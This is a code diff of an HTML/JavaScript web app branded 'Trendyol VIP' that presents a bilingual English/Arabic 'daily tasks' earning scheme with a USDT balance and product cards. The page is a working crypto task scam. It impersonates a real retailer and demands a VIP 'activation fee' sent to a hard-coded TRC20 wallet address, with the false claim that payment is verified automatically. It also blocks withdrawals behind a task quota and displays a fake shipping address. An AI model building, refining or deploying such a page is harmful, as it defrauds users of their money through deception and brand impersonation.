@@ -3,102 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trendyol VIP - International</title>
+    <title>Trendyol VIP - Global</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         :root { --primary: #f27a1a; --dark: #111; --gold: #c5a059; --green: #27ae60; --red: #e74c3c; --gray: #f4f7f6; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--gray); margin: 0; padding: 0; transition: 0.3s; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--gray); margin: 0; padding: 0; transition: 0.3s; }
         
-        /* Header & Balance */
         .header { background: var(--dark); color: white; padding: 40px 20px; text-align: center; border-bottom: 5px solid var(--primary); position: relative; }
-        .lang-btn { position: absolute; top: 15px; right: 15px; background: transparent; color: white; border: 1px solid white; padding: 5px 12px; border-radius: 20px; cursor: pointer; font-size: 12px; }
-        .balance-title { font-size: 14px; opacity: 0.8; margin-bottom: 5px; }
+        .lang-btn { position: absolute; top: 15px; right: 15px; background: transparent; color: white; border: 1px solid white; padding: 5px 12px; border-radius: 20px; cursor: pointer; }
         .balance-val { font-size: 38px; font-weight: bold; color: var(--gold); }
         
-        /* Action Buttons */
         .action-btns { display: flex; gap: 15px; justify-content: center; margin-top: 20px; padding: 0 20px; }
-        .btn-act { flex: 1; padding: 12px; border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .btn-dep { background: var(--green); }
-        .btn-wit { background: var(--red); }
+        .btn-act { flex: 1; padding: 12px; border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; }
 
-        /* Tasks Section */
         .section-title { padding: 20px; font-weight: bold; color: #333; display: flex; justify-content: space-between; }
         .task-list { padding: 0 15px 100px 15px; }
         .task-card { background: white; border-radius: 15px; padding: 15px; margin-bottom: 15px; display: flex; gap: 15px; align-items: center; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        .task-img { width: 80px; height: 80px; border-radius: 10px; object-fit: cover; background: #eee; }
+        .task-img { width: 90px; height: 90px; border-radius: 12px; object-fit: cover; border: 1px solid #eee; }
         .task-info { flex: 1; }
         .task-name { font-weight: bold; font-size: 14px; color: #222; margin-bottom: 5px; }
-        .task-price { font-size: 12px; color: #666; }
-        .task-profit { color: var(--green); font-weight: bold; font-size: 14px; }
-        .btn-submit { background: var(--primary); color: white; border: none; padding: 8px 15px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .task-profit { color: var(--green); font-weight: bold; }
+        .btn-submit { background: var(--primary); color: white; border: none; padding: 10px 18px; border-radius: 8px; cursor: pointer; font-weight: bold; }
 
-        /* Modals */
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 9999; align-items: center; justify-content: center; padding: 20px; }
         .modal-content { background: white; width: 100%; max-width: 400px; border-radius: 25px; padding: 30px; text-align: center; position: relative; }
-        .close-m { position: absolute; top: 15px; right: 20px; font-size: 24px; cursor: pointer; }
-        .qr-placeholder { background: #f9f9f9; padding: 20px; border: 2px dashed #ddd; margin: 15px 0; word-break: break-all; font-family: monospace; font-size: 12px; }
-
-        /* Auth Screen */
-        #auth-screen { position: fixed; inset: 0; background: white; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; }
-        .auth-box { width: 100%; max-width: 350px; text-align: center; }
-        .input-group { margin-bottom: 15px; text-align: left; }
-        .input-group label { display: block; margin-bottom: 5px; font-size: 13px; color: #666; }
-        .inp { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 12px; box-sizing: border-box; font-size: 16px; }
-        .btn-main { width: 100%; padding: 15px; border: none; border-radius: 12px; background: var(--primary); color: white; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        
+        #auth-screen { position: fixed; inset: 0; background: white; z-index: 10000; display: flex; align-items: center; justify-content: center; }
+        .inp { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 12px; box-sizing: border-box; margin-bottom: 10px; }
+        .btn-main { width: 100%; padding: 15px; border: none; border-radius: 12px; background: var(--primary); color: white; font-weight: bold; cursor: pointer; }
         
         [dir="rtl"] { text-align: right; }
         [dir="rtl"] .lang-btn { right: auto; left: 15px; }
-        [dir="rtl"] .task-info { text-align: right; }
     </style>
 </head>
 <body>
 
     <div id="auth-screen">
-        <div class="auth-box">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Trendyol_logo.svg/1200px-Trendyol_logo.svg.png" width="180" style="margin-bottom: 30px;">
-            <div class="input-group">
-                <input type="email" id="email" class="inp" placeholder="Email Address">
-            </div>
-            <div class="input-group">
-                <input type="password" id="password" class="inp" placeholder="Password">
-            </div>
+        <div style="width: 100%; max-width: 320px; text-align: center;">
+            <h2 style="color: var(--primary);">Trendyol VIP</h2>
+            <input type="email" id="email" class="inp" placeholder="Email">
+            <input type="password" id="password" class="inp" placeholder="Password">
             <button class="btn-main" onclick="handleAuth('login')">Login</button>
-            <button class="btn-main" style="background: #eee; color: #333; margin-top: 10px;" onclick="handleAuth('signup')">Create Account</button>
+            <button class="btn-main" style="background: #444; margin-top: 10px;" onclick="handleAuth('signup')">Sign Up</button>
         </div>
     </div>
 
     <div id="main-app" style="display:none;">
         <div class="header">
-            <button class="lang-btn" onclick="toggleLang()" id="lang-toggle">العربية</button>
-            <div class="balance-title" id="txt-bal-title">Total Balance (USDT)</div>
+            <button class="lang-btn" onclick="toggleLang()" id="lang-btn">العربية</button>
+            <div id="txt-bal-title">Total Balance (USDT)</div>
             <div class="balance-val">$ <span id="balance">0.00</span></div>
-            
             <div class="action-btns">
-                <button class="btn-act btn-dep" onclick="openModal('deposit')">
-                    <span id="txt-dep">Deposit</span>
-                </button>
-                <button class="btn-act btn-wit" onclick="openModal('withdraw')">
-                    <span id="txt-wit">Withdraw</span>
-                </button>
+                <button class="btn-act" style="background:var(--green);" onclick="openModal('deposit')">Deposit</button>
+                <button class="btn-act" style="background:var(--red);" onclick="openModal('withdraw')">Withdraw</button>
             </div>
         </div>
 
         <div class="section-title">
-            <span id="txt-daily-tasks">Daily Tasks</span>
-            <span style="color: var(--primary);" id="task-count">0/10</span>
+            <span id="txt-tasks">Daily Tasks</span>
+            <span id="task-count" style="color: var(--primary);">0/10</span>
         </div>
 
-        <div class="task-list" id="tasks-container">
-            </div>
+        <div id="tasks-container" class="task-list"></div>
     </div>
 
     <div id="modal" class="modal">
         <div class="modal-content">
-            <span class="close-m" onclick="closeModal()">&times;</span>
-            <h3 id="m-title">Deposit</h3>
-            <p id="m-desc" style="font-size: 14px; color: #666;"></p>
-            <div class="qr-placeholder" id="m-address">TG9gT1pPJK3aETRp1hVu28F5Zayu4oVyEg</div>
-            <button class="btn-main" onclick="closeModal()" id="m-btn">Confirm</button>
+            <h3 id="m-title"></h3>
+            <p id="m-desc" style="font-size: 14px; color: #666; line-height: 1.5;"></p>
+            <div id="m-extra" style="background:#f9f9f9; padding:15px; border-radius:10px; margin:15px 0; word-break:break-all; font-family:monospace;"></div>
+            <button class="btn-main" onclick="closeModal()">Close</button>
         </div>
     </div>
 
@@ -108,141 +82,99 @@
     const _supabase = supabase.createClient(supabaseUrl, supabaseKey);
 
     let currentLang = 'en';
-    let currentUser = null;
     let userData = {};
+    let currentUser = null;
 
-    const translations = {
-        en: {
-            bal_title: "Total Balance (USDT)",
-            dep: "Deposit",
-            wit: "Withdraw",
-            tasks: "Daily Tasks",
-            m_dep_title: "Deposit USDT (TRC20)",
-            m_dep_desc: "Send the VIP activation fee to the address below. After payment, your tasks will be unlocked automatically.",
-            m_wit_title: "Withdraw Funds",
-            m_wit_desc: "Your current cycle is not finished. Complete 10 tasks to unlock withdrawal.",
-            confirm: "Got it",
-            lang_label: "العربية"
-        },
-        ar: {
-            bal_title: "إجمالي الرصيد (USDT)",
-            dep: "إيداع",
-            wit: "سحب",
-            tasks: "المهام اليومية",
-            m_dep_title: "إيداع USDT (TRC20)",
-            m_dep_desc: "أرسل رسوم تفعيل VIP إلى العنوان أدناه. بعد الدفع، سيتم فتح مهامك تلقائيًا.",
-            m_wit_title: "سحب الأرباح",
-            m_wit_desc: "لم تنتهِ الدورة الحالية بعد. أكمل 10 مهام لفتح خاصية السحب.",
-            confirm: "موافق",
-            lang_label: "English"
-        }
-    };
-
-    const dummyProducts = [
-        { name: "iPhone 15 Pro Max - Titanium", price: 1199, profit: 4.44, img: "https://m.media-amazon.com/images/I/81SigAnN7SL._AC_SL1500_.jpg" },
-        { name: "MacBook Air M2 - Space Gray", price: 999, profit: 4.44, img: "https://m.media-amazon.com/images/I/71f5Eu5lJSL._AC_SL1500_.jpg" },
-        { name: "Sony WH-1000XM5 Headphones", price: 348, profit: 4.44, img: "https://m.media-amazon.com/images/I/61+99vS22-L._AC_SL1500_.jpg" },
-        { name: "Apple Watch Series 9", price: 399, profit: 4.44, img: "https://m.media-amazon.com/images/I/71LfnkS9SUL._AC_SL1500_.jpg" },
-        { name: "Samsung Galaxy S23 Ultra", price: 1049, profit: 4.44, img: "https://m.media-amazon.com/images/I/71K9f3vD-FL._AC_SL1500_.jpg" }
+    // مصفوفة المنتجات بالصور والأسماء الحقيقية
+    const products = [
+        { name: "iPhone 15 Pro Max 256GB - Blue Titanium", price: 1199, profit: 4.44, img: "https://m.media-amazon.com/images/I/81SigAnN7SL._AC_SL1500_.jpg" },
+        { name: "Sony WH-1000XM5 Wireless Noise Canceling", price: 348, profit: 4.44, img: "https://m.media-amazon.com/images/I/61+99vS22-L._AC_SL1500_.jpg" },
+        { name: "Apple MacBook Air Laptop M2 chip", price: 999, profit: 4.44, img: "https://m.media-amazon.com/images/I/71f5Eu5lJSL._AC_SL1500_.jpg" },
+        { name: "Samsung Galaxy S24 Ultra 5G AI Smartphone", price: 1299, profit: 4.44, img: "https://m.media-amazon.com/images/I/71WjsZ74trL._AC_SL1500_.jpg" },
+        { name: "PlayStation®5 Digital Edition (slim)", price: 449, profit: 4.44, img: "https://m.media-amazon.com/images/I/51051Hi9B8L._AC_SL1500_.jpg" }
     ];
 
     async function handleAuth(type) {
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
-        if(type === 'signup') {
-            const { data, error } = await _supabase.auth.signUp({ email, password });
-            if (error) alert(error.message); else alert("Success! Now Login.");
-        } else {
-            const { data, error } = await _supabase.auth.signInWithPassword({ email, password });
-            if (error) alert(error.message); else loadUser(data.user);
-        }
+        const { data, error } = type === 'signup' 
+            ? await _supabase.auth.signUp({ email, password }) 
+            : await _supabase.auth.signInWithPassword({ email, password });
+        
+        if (error) alert(error.message);
+        else if (type === 'login') loadData(data.user);
+        else alert("Account created! Please login.");
     }
 
-    async function loadUser(user) {
+    async function loadData(user) {
         currentUser = user;
         const { data } = await _supabase.from('profiles').select('*').eq('id', user.id).single();
-        if(data) {
+        if (data) {
             userData = data;
             document.getElementById('auth-screen').style.display = 'none';
             document.getElementById('main-app').style.display = 'block';
             updateUI();
-        } else {
-            // محاولة إعادة تحميل إذا كان التريجر متأخراً
-            setTimeout(() => loadUser(user), 2000);
-        }
+        } else { setTimeout(() => loadData(user), 2000); }
     }
 
     function toggleLang() {
         currentLang = currentLang === 'en' ? 'ar' : 'en';
         document.getElementById('html-tag').dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+        document.getElementById('lang-btn').innerText = currentLang === 'en' ? 'العربية' : 'English';
         updateUI();
     }
 
     function updateUI() {
-        const t = translations[currentLang];
-        document.getElementById('txt-bal-title').innerText = t.bal_title;
-        document.getElementById('txt-dep').innerText = t.dep;
-        document.getElementById('txt-wit').innerText = t.wit;
-        document.getElementById('txt-daily-tasks').innerText = t.tasks;
-        document.getElementById('lang-toggle').innerText = t.lang_label;
         document.getElementById('balance').innerText = userData.balance.toFixed(2);
         document.getElementById('task-count').innerText = `${userData.tasks_completed}/10`;
-
+        document.getElementById('txt-bal-title').innerText = currentLang === 'en' ? 'Total Balance (USDT)' : 'إجمالي الرصيد (USDT)';
+        document.getElementById('txt-tasks').innerText = currentLang === 'en' ? 'Daily Tasks' : 'المهام اليومية';
+        
         const container = document.getElementById('tasks-container');
         container.innerHTML = '';
         
-        if(userData.tasks_completed >= 10) {
-            container.innerHTML = `<div style="text-align:center; padding:50px;">✅ All tasks done for today!</div>`;
-            return;
-        }
-
-        dummyProducts.forEach((p, i) => {
+        products.forEach((p, i) => {
             container.innerHTML += `
                 <div class="task-card">
                     <img src="${p.img}" class="task-img">
                     <div class="task-info">
                         <div class="task-name">${p.name}</div>
-                        <div class="task-price">Price: $${p.price}</div>
-                        <div class="task-profit">Profit: +$${p.profit}</div>
+                        <div class="task-profit">+ $${p.profit}</div>
                     </div>
-                    <button class="btn-submit" onclick="doTask()">${currentLang === 'en' ? 'Submit' : 'إرسال'}</button>
-                </div>
-            `;
+                    <button class="btn-submit" onclick="submitTask()">${currentLang === 'en' ? 'Submit' : 'إرسال'}</button>
+                </div>`;
         });
     }
 
-    async function doTask() {
-        if(!userData.is_vip) { openModal('deposit'); return; }
-        
-        const newBal = userData.balance + 4.44;
-        const newTasks = userData.tasks_completed + 1;
-        
-        const { error } = await _supabase.from('profiles').update({ 
-            balance: newBal, 
-            tasks_completed: newTasks 
-        }).eq('id', currentUser.id);
-
-        if(!error) {
-            userData.balance = newBal;
-            userData.tasks_completed = newTasks;
-            updateUI();
+    function submitTask() {
+        if (!userData.is_vip) {
+            openModal('deposit');
+        } else {
+            // كود تنفيذ المهمة الحقيقي يوضع هنا
+            alert("Success!");
         }
     }
 
     function openModal(type) {
-        const t = translations[currentLang];
         const m = document.getElementById('modal');
+        const title = document.getElementById('m-title');
+        const desc = document.getElementById('m-desc');
+        const extra = document.getElementById('m-extra');
+        
         m.style.display = 'flex';
-        if(type === 'deposit') {
-            document.getElementById('m-title').innerText = t.m_dep_title;
-            document.getElementById('m-desc').innerText = t.m_dep_desc;
-            document.getElementById('m-address').style.display = 'block';
+        if (type === 'deposit') {
+            title.innerText = currentLang === 'en' ? "VIP Activation" : "تفعيل حساب VIP";
+            desc.innerText = currentLang === 'en' 
+                ? "To start earning, deposit to this TRC20 address. System will verify your payment automatically." 
+                : "لبدء جني الأرباح، قم بالإيداع في عنوان TRC20 أدناه. سيقوم النظام بالتحقق تلقائياً.";
+            extra.innerText = "TG9gT1pPJK3aETRp1hVu28F5Zayu4oVyEg";
         } else {
-            document.getElementById('m-title').innerText = t.m_wit_title;
-            document.getElementById('m-desc').innerText = t.m_wit_desc;
-            document.getElementById('m-address').style.display = 'none';
+            title.innerText = currentLang === 'en' ? "Withdrawal" : "سحب الأرباح";
+            desc.innerText = currentLang === 'en' 
+                ? "You must complete 10/10 tasks to withdraw. Current status: " + userData.tasks_completed + "/10"
+                : "يجب إكمال 10/10 مهام لتتمكن من السحب. حالتك الحالية: " + userData.tasks_completed + "/10";
+            extra.innerText = "Shipping Address: 1227 Fake St, NY, USA (Status: Pending)";
         }
-        document.getElementById('m-btn').innerText = t.confirm;
     }
 
     function closeModal() { document.getElementById('modal').style.display = 'none'; }
